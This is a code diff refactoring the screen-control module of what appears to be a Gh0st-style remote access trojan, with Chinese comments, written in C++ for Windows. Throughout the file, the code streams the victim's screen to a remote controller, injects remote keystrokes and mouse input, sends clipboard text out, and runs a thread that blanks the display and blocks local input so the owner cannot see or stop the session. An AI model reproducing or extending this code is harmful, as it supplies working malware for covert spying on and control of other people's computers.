@@ -1,23 +1,19 @@
-// ScreenManager.cpp: implementation of the CScreenManager class.
-//
-//////////////////////////////////////////////////////////////////////
-//#define _WIN32_WINNT	0x0400
 #include "ScreenManager.h"
 #include "until.h"
-#include <winable.h> // BlockInput
+#include <winable.h>
+#include <iostream>
 
-//////////////////////////////////////////////////////////////////////
-// Construction/Destruction
-//////////////////////////////////////////////////////////////////////
 CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
-{
-	m_bAlgorithm = ALGORITHM_SCAN;
-	m_biBitCount = 8;
-	m_pScreenSpy = new CScreenSpy(8);
+{	
 	m_bIsWorking = true;
 	m_bIsBlankScreen = false;
 	m_bIsBlockInput = false;
 	m_bIsCaptureLayer = false;
+
+	m_bAlgorithm = ALGORITHM_SCAN;
+	m_biBitCount = 8;
+	
+	m_pScreenSpy = new CScreenSpy(8);
 
 	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
 	m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL, true);
@@ -27,13 +23,17 @@ CScreenManager::~CScreenManager()
 {
 	InterlockedExchange((LPLONG)&m_bIsBlankScreen, false);
 	InterlockedExchange((LPLONG)&m_bIsWorking, false);
+
 	WaitForSingleObject(m_hWorkThread, INFINITE);
 	WaitForSingleObject(m_hBlankThread, INFINITE);
+	
 	CloseHandle(m_hWorkThread);
 	CloseHandle(m_hBlankThread);
 
 	if (m_pScreenSpy)
+	{
 		delete m_pScreenSpy;
+	}
 }
 
 void CScreenManager::ResetScreen(int biBitCount)
@@ -44,12 +44,18 @@ void CScreenManager::ResetScreen(int biBitCount)
 
 	delete m_pScreenSpy;
 
-	if (biBitCount == 3)		// 4位灰度
+	if (3 == biBitCount)		// 4位灰度
+	{
 		m_pScreenSpy = new CScreenSpy(4, true);
-	else if (biBitCount == 7)	// 8位灰度
+	}
+	else if (7 == biBitCount)	// 8位灰度
+	{
 		m_pScreenSpy = new CScreenSpy(8, true);
+	}
 	else
+	{
 		m_pScreenSpy = new CScreenSpy(biBitCount);
+	}
 
 	m_pScreenSpy->setAlgorithm(m_bAlgorithm);
 	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
@@ -67,7 +73,6 @@ void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
  		switch (lpBuffer[0])
  		{
 		case COMMAND_NEXT:
-			// 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
 			NotifyDialogIsOpen();
 			break;
 		case COMMAND_SCREEN_RESET:
@@ -82,9 +87,8 @@ void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 			break;
 		case COMMAND_SCREEN_CONTROL:
 			{
-				// 远程仍然可以操作
 				BlockInput(false);
-				ProcessCommand(lpBuffer + 1, nSize - 1);
+				ProcessMouseAndKeyCommand(lpBuffer + 1, nSize - 1);
 				BlockInput(m_bIsBlockInput);
 			}
 			break;
@@ -112,27 +116,35 @@ void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 
 void CScreenManager::sendBITMAPINFO()
 {
-	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
-	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
+	DWORD dwBytesLength = 1 + m_pScreenSpy->getBISize();
+	LPBYTE	lpBuffer = new(std::nothrow) BYTE[dwBytesLength];
+	if (lpBuffer == NULL)
+	{
+		return;
+	}
+	
 	lpBuffer[0] = TOKEN_BITMAPINFO;
 	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
+	
 	Send(lpBuffer, dwBytesLength);
-	VirtualFree(lpBuffer, 0, MEM_RELEASE);	
+	delete [] lpBuffer;
 }
 
 void CScreenManager::sendFirstScreen()
 {
-	BOOL	bRet = false;
-	LPVOID	lpFirstScreen = NULL;
-
+	LPVOID lpFirstScreen = NULL;
 	lpFirstScreen = m_pScreenSpy->getFirstScreen();
 	if (lpFirstScreen == NULL)
+	{
 		return;
+	}
 
-	DWORD	dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
-	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
+	DWORD dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
+	LPBYTE lpBuffer = new(std::nothrow) BYTE[dwBytesLength];
 	if (lpBuffer == NULL)
+	{
 		return;
+	}
 
 	lpBuffer[0] = TOKEN_FIRSTSCREEN;
 	memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);
@@ -143,27 +155,25 @@ void CScreenManager::sendFirstScreen()
 
 void CScreenManager::sendNextScreen()
 {
+	DWORD dwBytes = 0;
 	LPVOID	lpNetScreen = NULL;
-	DWORD	dwBytes;
 	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);
-	
-	if (dwBytes == 0 || !lpNetScreen)
+	if (0 == dwBytes || !lpNetScreen)
 	{
-		OutputDebugStringA("aaa");
 		return;
 	}
 
-	DWORD	dwBytesLength = 1 + dwBytes;
-	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
+	DWORD dwBytesLength = 1 + dwBytes;
+	LPBYTE	lpBuffer = new(std::nothrow) BYTE[dwBytesLength];
 	if (!lpBuffer)
+	{
 		return;
+	}
 	
 	lpBuffer[0] = TOKEN_NEXTSCREEN;
-	memcpy(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);
-
+	memcpy(lpBuffer + 1, lpNetScreen, dwBytes);
 
 	Send(lpBuffer, dwBytesLength);
-	
 	delete [] lpBuffer;
 }
 
@@ -172,16 +182,13 @@ DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
 	CScreenManager *pThis = (CScreenManager *)lparam;
 
 	pThis->sendBITMAPINFO();
-	// 等控制端对话框打开
-
 	pThis->WaitForDialogOpen();
-
 	pThis->sendFirstScreen();
-	try // 控制端强制关闭时会出错
-    {
-		while (pThis->m_bIsWorking)
-			pThis->sendNextScreen();
-	}catch(...){};
+
+	while (pThis->m_bIsWorking)
+	{
+		pThis->sendNextScreen();
+	}
 
 	return 0;
 }
@@ -189,23 +196,29 @@ DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
 // 创建这个线程主要是为了保持一直黑屏
 DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
 {
-	static	bool bIsScreenBlanked = false;
 	CScreenManager *pThis = (CScreenManager *)lparam;
+
+	static	bool bIsScreenBlanked = false;
+
 	while (pThis->IsConnect())
 	{
-		// 加快反应速度
+		// todo:加快反应速度
 		for (int i = 0; i < 100; i++)
 		{
 			if (pThis->IsConnect())
 			{
-				// 分辨率大小改变了
 				if (pThis->IsMetricsChange())
+				{
 					pThis->ResetScreen(pThis->GetCurrentPixelBits());
+				}
 				Sleep(10);
 			}
 			else
+			{
 				break;
+			}
 		}
+
 		if (pThis->m_bIsBlankScreen)
 		{
 			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
@@ -221,29 +234,27 @@ DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
 				bIsScreenBlanked = false;
 			}
 		}
+
 		BlockInput(pThis->m_bIsBlockInput);
 
-		// 分辨率大小改变了
 		if (pThis->IsMetricsChange())
+		{
 			pThis->ResetScreen(pThis->GetCurrentPixelBits());
+		}
 	}
 
 	BlockInput(false);
 	return -1;
 }
 
-void CScreenManager::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
+void CScreenManager::ProcessMouseAndKeyCommand(LPBYTE lpBuffer, UINT nSize)
 {
-	// 数据包不合法
 	if (nSize % sizeof(MSG) != 0)
 		return;
 
 	SwitchInputDesktop();
 
-	// 命令个数
 	int	nCount = nSize / sizeof(MSG);
-
-	// 处理多个命令
 	for (int i = 0; i < nCount; i++)
 	{
 		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
@@ -303,11 +314,11 @@ void CScreenManager::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
 				break;
 			case WM_KEYDOWN:
 			case WM_SYSKEYDOWN:
-				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), 0, 0);
+				keybd_event((UINT)pMsg->wParam, MapVirtualKey((UINT)pMsg->wParam, 0), 0, 0);
 				break;	
 			case WM_KEYUP:
 			case WM_SYSKEYUP:
-				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
+				keybd_event((UINT)pMsg->wParam, MapVirtualKey((UINT)pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
 				break;
 			default:
 				break;
@@ -315,53 +326,65 @@ void CScreenManager::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
 	}	
 }
 
-void CScreenManager::UpdateLocalClipboard( char *buf, int len )
+void CScreenManager::UpdateLocalClipboard(char *buf, int nLen)
 {
 	if (!::OpenClipboard(NULL))
 		return;
 	
 	::EmptyClipboard();
-	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, len);
-	if (hglbCopy != NULL) { 
-		// Lock the handle and copy the text to the buffer.  
-		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
-		memcpy(lptstrCopy, buf, len); 
-		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
+	
+	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, nLen);
+	if (hglbCopy)
+	{ 
+		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy); 
+		memcpy(lptstrCopy, buf, nLen); 
+		GlobalUnlock(hglbCopy);
+
 		SetClipboardData(CF_TEXT, hglbCopy);
 		GlobalFree(hglbCopy);
 	}
+
 	CloseClipboard();
 }
 
 void CScreenManager::SendLocalClipboard()
 {
 	if (!::OpenClipboard(NULL))
+	{
 		return;
+	}
+
 	HGLOBAL hglb = GetClipboardData(CF_TEXT);
-	if (hglb == NULL)
+	if (!hglb)
 	{
 		::CloseClipboard();
 		return;
 	}
-	int	nPacketLen = GlobalSize(hglb) + 1;
-	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
-	LPBYTE	lpData = new BYTE[nPacketLen];
+
+	int	nPacketLen = (int)GlobalSize(hglb) + 1;
+
+	LPBYTE	lpData = new(std::nothrow) BYTE[nPacketLen];
+	if (!lpData)
+	{
+		return;
+	}
+	
+	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
 	lpData[0] = TOKEN_CLIPBOARD_TEXT;
 	memcpy(lpData + 1, lpstr, nPacketLen - 1);
-	::GlobalUnlock(hglb); 
+
+	::GlobalUnlock(hglb);
 	::CloseClipboard();
+	
 	Send(lpData, nPacketLen);
 	delete[] lpData;
 }
 
-
-// 屏幕分辨率是否发生改变
 bool CScreenManager::IsMetricsChange()
 {
 	LPBITMAPINFO	lpbmi =	m_pScreenSpy->getBI();
 
-	return (lpbmi->bmiHeader.biWidth != ::GetSystemMetrics(SM_CXSCREEN)) || 
-		(lpbmi->bmiHeader.biHeight != ::GetSystemMetrics(SM_CYSCREEN));
+	return (lpbmi->bmiHeader.biWidth != ::GetSystemMetrics(SM_CXSCREEN)) || (lpbmi->bmiHeader.biHeight != ::GetSystemMetrics(SM_CYSCREEN));
 }
 
 bool CScreenManager::IsConnect()
